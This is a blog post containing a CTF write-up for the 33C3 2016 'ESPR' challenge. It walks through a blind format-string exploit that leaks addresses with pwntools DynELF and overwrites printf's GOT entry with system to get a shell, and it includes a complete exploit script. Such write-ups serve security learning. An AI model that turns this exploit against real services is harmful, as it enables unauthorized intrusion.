<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.13.0 by Michael Rose
  Copyright 2013-2018 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE.txt
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>33C3 CTF 2016 – ESPR - Hacking Tube 2.0</title>
<meta name="description" content="Category: pwnPoints: 150">



<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="Hacking Tube 2.0">
<meta property="og:title" content="33C3 CTF 2016 – ESPR">
<meta property="og:url" content="http://0.0.0.0:4000/33c3-ctf-2016-espr/">


  <meta property="og:description" content="Category: pwnPoints: 150">







  <meta property="article:published_time" content="2016-12-29T22:52:00+08:00">






<link rel="canonical" href="http://0.0.0.0:4000/33c3-ctf-2016-espr/">













<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Hacking Tube 2.0 Feed">

<!-- http://t.co/dKP3o1e -->
<meta name="HandheldFriendly" content="True">
<meta name="MobileOptimized" content="320">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if lte IE 9]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->


    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single">

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    <div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        <a class="site-title" href="/">Hacking Tube 2.0</a>
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/about" >About</a>
            </li><li class="masthead__menu-item">
              <a href="/archives/" >Archive</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/" >Categories</a>
            </li><li class="masthead__menu-item">
              <a href="/tags/" >Tags</a>
            </li></ul>
        
        <button class="search__toggle" type="button">
          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
          </svg>
        </button>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle Menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>


    <div class="initial-content">
      



<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="http://schema.org/Person">

  
    <div class="author__avatar">
      

      
        <img src="/assets/images/other/gravatar.png" alt="Bruce Chen" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">Bruce Chen</h3>
    
    
      <p class="author__bio" itemprop="description">
        Vulnerability researcher / CTFer
      </p>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="http://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Taiwan</span>
        </li>
      

      
        
          
            <li><a href="https://twitter.com/bruce30262"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter</a></li>
          
        
          
            <li><a href="https://github.com/bruce30262"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
          
        
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>


  <article class="page" itemscope itemtype="http://schema.org/CreativeWork">
    <meta itemprop="headline" content="33C3 CTF 2016 – ESPR">
    <meta itemprop="description" content="Category: pwnPoints: 150">
    <meta itemprop="datePublished" content="December 29, 2016">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">33C3 CTF 2016 – ESPR
</h1>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
        <p><strong>Category:</strong> pwn
<strong>Points:</strong> 150</p>

<!-- more -->

<p>This time there’s no binary or libc.so provided, only an image looks like this:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
eat:                  sleep:
+-----------------+   +----------------+
| sub rsp, 0x100  |   | mov edi, 0x1   |
| mov rdi, rsp    |   | call _sleep    |
| call _gets      |   |                |
|                 |   |                |
+-----------------+   +----------------+
pwn:                  repeat:
+-----------------+   +----------------+
| mov rdi, rsp    |   |                |
| call _printf    |   | jmp eat        |
| add rsp, 0x100  |   |                |
|                 |   |                |
+-----------------+   +----------------+
</code></pre></div></div>

<p>Interesting…</p>

<p>So apparently the program has two vulnerabilities: <strong>stack overflow</strong> &amp; <strong>format string</strong>. Since we can’t actually exploit the stack overflow vulnerability (the program likely won’t return because of the infinite loop), we’ll have to focus on the format string vulnerability and exploit the service without having the binary file.</p>

<p>So how are we gonna do this? Fortunately, <a href="https://github.com/Gallopsled/pwntools">pwntools</a> is here to rescue! <strong>By using the amazing <a href="http://docs.pwntools.com/en/stable/dynelf.html">DynELF</a> module, we’re able to resolve &amp; leak some address without the need for binary!</strong></p>

<p>First we’ll need a <code class="highlighter-rouge">leak</code> function to let pwntools able to leak data at an arbitrary address. Here we exploit the format string vulnerability to leak an arbitrary address:
```python leak
def leak(addr):
    payload = “%7$s.AAA”+p64(addr)
    r.sendline(payload)
    print “leaking:”, hex(addr)
    resp = r.recvuntil(“.AAA”)
    ret = resp[:-4:] + “\x00”
    print “ret:”, repr(ret)
    r.recvrepeat(0.2) # receive the rest of the string
    return ret</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Then we need a pointer into the binary. I got the pointer by entering `%30$p`, which returned `0x40060d`. Now we can use the `DynELF` module to help us resolve some function addresses.

First we'll need to resolve the address of `printf` and `system`:
```python leak library addresses
d = DynELF(leak, 0x40060d)
system_addr = d.lookup('system', 'libc')
printf_addr = d.lookup('printf', 'libc')

log.success("printf_addr: "+hex(printf_addr))
log.success("system_addr: "+hex(system_addr))
</code></pre></div></div>

<p>It took a while because of <code class="highlighter-rouge">sleep(1)</code>, and pwntools will need a lot of addresses to resolve those functions.</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[+] printf_addr: 0x7fb040a17550
[+] system_addr: 0x7fb040a066d0
</code></pre></div></div>

<p>OK so now we know the offset between <code class="highlighter-rouge">printf</code> and <code class="highlighter-rouge">system</code>. Next time we’ll just have to leak <code class="highlighter-rouge">printf@got.plt</code>, calculate <code class="highlighter-rouge">system</code>’s address and use it to overwrite <code class="highlighter-rouge">printf</code>’s GOT entry, finally we’ll be able to hijack <code class="highlighter-rouge">printf</code>’s GOT and call <code class="highlighter-rouge">system("sh")</code> by entering “sh”.</p>

<p>But first we’ll have to know the address of <code class="highlighter-rouge">printf@got.plt</code>. Luckily, not only can <code class="highlighter-rouge">DynELF</code> resolve function addresses, it can also resolve some useful addresses such as the pointer to the <code class="highlighter-rouge">.dynamic</code> section:
```python resolve .dynamic section
d = DynELF(leak, 0x40060d)
dynamic_ptr = d.dynamic</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
Once we got the `.dynamic` section's address, we can use it to locate the `.got.plt` area:
</code></pre></div></div>
<p>Dynamic section at offset 0xe28 contains 24 entries:
  Tag        Type                         Name/Value
 0x0000000000000001 (NEEDED)             Shared library: [libc.so.6]
 0x000000000000000c (INIT)               0x400400
 0x000000000000000d (FINI)               0x400614
 0x0000000000000019 (INIT_ARRAY)         0x600e10
 0x000000000000001b (INIT_ARRAYSZ)       8 (bytes)
 0x000000000000001a (FINI_ARRAY)         0x600e18
 0x000000000000001c (FINI_ARRAYSZ)       8 (bytes)
 0x000000006ffffef5 (GNU_HASH)           0x400298
 0x0000000000000005 (STRTAB)             0x400330
 0x0000000000000006 (SYMTAB)             0x4002b8
 0x000000000000000a (STRSZ)              68 (bytes)
 0x000000000000000b (SYMENT)             24 (bytes)
 0x0000000000000015 (DEBUG)              0x0
 0x0000000000000003 (PLTGOT)             0x601000  &lt;— here</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>```python resolve PLTGOT
    cnt = 0
    while True:
        addr = dynamic_ptr + 0x10*cnt
        ret = leak(addr)
        if ret == "\x03\x00": #TYPE PLTGOT
            addr += 8
            for i in xrange(8):
                ret = leak(addr+i)
                print "ret:", ret.encode('hex')
            break
        else:
            cnt += 1
</code></pre></div></div>

<p>Now we can find where <code class="highlighter-rouge">printf@got.plt</code> is, by leaking all the GOT entry and compare the low 12 bits of the function address (see if it ends with <code class="highlighter-rouge">550</code>):
```python resolve printf@got.plt
got = 0x601000
for i in xrange(8):
    addr = got + i*8
    ret = leak(addr)
    print “ret:”, ret.encode(‘hex’)</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
Finally, we can start exploiting the service:
```python exp_espr.py
#!/usr/bin/env python

from pwn import *
import subprocess
import sys
import time

HOST = "78.46.224.86"
PORT = 1337
# setting 
context.arch = 'amd64'
context.os = 'linux'
context.endian = 'little'
context.word_size = 32
# ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
context.log_level = 'INFO'

def leak(addr):
    payload = "%7$s.AAA"+p64(addr)
    r.sendline(payload)
    print "leaking:", hex(addr)
    resp = r.recvuntil(".AAA")
    ret = resp[:-4:] + "\x00"
    print "ret:", repr(ret)
	r.recvrepeat(0.2)
    return ret
    
if __name__ == "__main__":

    r = remote(HOST, PORT)

    printf_got = 0x601018
    printf_addr = u64(leak(printf_got).ljust(8, "\x00"))
    system_addr = printf_addr - 0x10e80 # remote

    log.success("printf_addr: "+hex(printf_addr))
    log.success("system_addr: "+hex(system_addr))

    byte1 = system_addr &amp; 0xff
    byte2 = (system_addr &amp; 0xffff00) &gt;&gt; 8
    log.success("byte1: "+hex(byte1))
    log.success("byte2: "+hex(byte2))

    payload = "%" + str(byte1) + "c" + "%10$hhn."
    payload += "%" + str(byte2-byte1-1) + "c" + "%11$hn."
    payload = payload.ljust(32, "A")
    payload += p64(printf_got) + p64(printf_got+1)
    r.sendline(payload)
    r.sendline("sh\x00")
    r.interactive()
</code></pre></div></div>

<p>flag: <code class="highlighter-rouge">33C3_f1rst_tshirt_challenge?!</code></p>

        
      </section>

      <footer class="page__meta">
        
        
  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/tags/#33c3" class="page__taxonomy-item" rel="tag">33C3</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#ctf" class="page__taxonomy-item" rel="tag">CTF</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#format-string" class="page__taxonomy-item" rel="tag">format_string</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#pwnable" class="page__taxonomy-item" rel="tag">Pwnable</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#python" class="page__taxonomy-item" rel="tag">Python</a>
    
    </span>
  </p>




  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#write-ups" class="page__taxonomy-item" rel="tag">write-ups</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2016-12-29T22:52:00+08:00">December 29, 2016</time></p>
        
      </footer>

      <!-- /usr/gem/gems/minimal-mistakes-jekyll-4.13.0/_includes/social-share.html -->
<!-- Remove linkdin shared button -->
<section class="page__share">
  

  <a href="https://twitter.com/intent/tweet?text=33C3+CTF+2016+--+ESPR%20http%3A%2F%2F0.0.0.0%3A4000%2F33c3-ctf-2016-espr%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>

  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2F0.0.0.0%3A4000%2F33c3-ctf-2016-espr%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>

  <a href="https://plus.google.com/share?url=http%3A%2F%2F0.0.0.0%3A4000%2F33c3-ctf-2016-espr%2F" class="btn btn--google-plus" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Google Plus"><i class="fab fa-fw fa-google-plus" aria-hidden="true"></i><span> Google+</span></a>

</section>


      
  <nav class="pagination">
    
      <a href="/33c3-ctf-2016-the-0x90s-called/" class="pagination--pager" title="33C3 CTF 2016 – The 0x90s called
">Previous</a>
    
    
      <a href="/33c3-ctf-2016-babyfengshui/" class="pagination--pager" title="33C3 CTF 2016 – babyfengshui
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
  
    <div class="page__related">
      <h4 class="page__related-title">You May Also Enjoy</h4>
      <div class="grid__wrapper">
        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
    
    <h2 class="archive__item-title" itemprop="headline">
      
        <a href="/Chakrazy-exploiting-type-confusion-bug-in-ChakraCore/" rel="permalink">Chakrazy – exploiting type confusion bug in ChakraCore engine
</a>
      
    </h2>
    
    <p class="archive__item-excerpt" itemprop="description">Introduction

</p>
  </article>
</div>
        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
    
    <h2 class="archive__item-title" itemprop="headline">
      
        <a href="/Learning-browser-exploitation-via-33C3-CTF-feuerfuchs-challenge/" rel="permalink">Learning browser exploitation via 33C3 CTF  feuerfuchs challenge
</a>
      
    </h2>
    
    <p class="archive__item-excerpt" itemprop="description">Introduction

</p>
  </article>
</div>
        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
    
    <h2 class="archive__item-title" itemprop="headline">
      
        <a href="/hxp-CTF-2017-hardened-flag-store/" rel="permalink">hxp CTF 2017 – hardened_flag_store
</a>
      
    </h2>
    
    <p class="archive__item-excerpt" itemprop="description">Category: Pwnable

</p>
  </article>
</div>
        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
    
    <h2 class="archive__item-title" itemprop="headline">
      
        <a href="/MeePwn-CTF-2017-Brainfuck-1-2/" rel="permalink">MeePwn CTF 2017 – Brainfuck 1 &amp; 2
</a>
      
    </h2>
    
    <p class="archive__item-excerpt" itemprop="description">Category: Pwnable

</p>
  </article>
</div>
        
      </div>
    </div>
  
</div>
    </div>

    
      <div class="search-content">
        <div class="search-content__inner-wrap"><input type="text" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
    <div id="results" class="results"></div></div>
      </div>
    

    <div class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    

    

    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>
</div>

<div class="page__footer-copyright">&copy; 2018 Bruce Chen. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script src="https://use.fontawesome.com/releases/v5.2.0/js/all.js"></script>




<script src="/assets/js/lunr/lunr.min.js"></script>
<script src="/assets/js/lunr/lunr-store.js"></script>
<script src="/assets/js/lunr/lunr-en.js"></script>




    
  <script>
    var disqus_config = function () {
      this.page.url = "http://0.0.0.0:4000/33c3-ctf-2016-espr/";  // Replace PAGE_URL with your page's canonical URL variable
      this.page.identifier = "/33c3-ctf-2016-espr"; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
    };
    (function() { // DON'T EDIT BELOW THIS LINE
      var d = document, s = d.createElement('script');
      s.src = 'https://bruce30262logdown.disqus.com/embed.js';
      s.setAttribute('data-timestamp', +new Date());
      (d.head || d.body).appendChild(s);
    })();
  </script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>


  



  </body>
</html>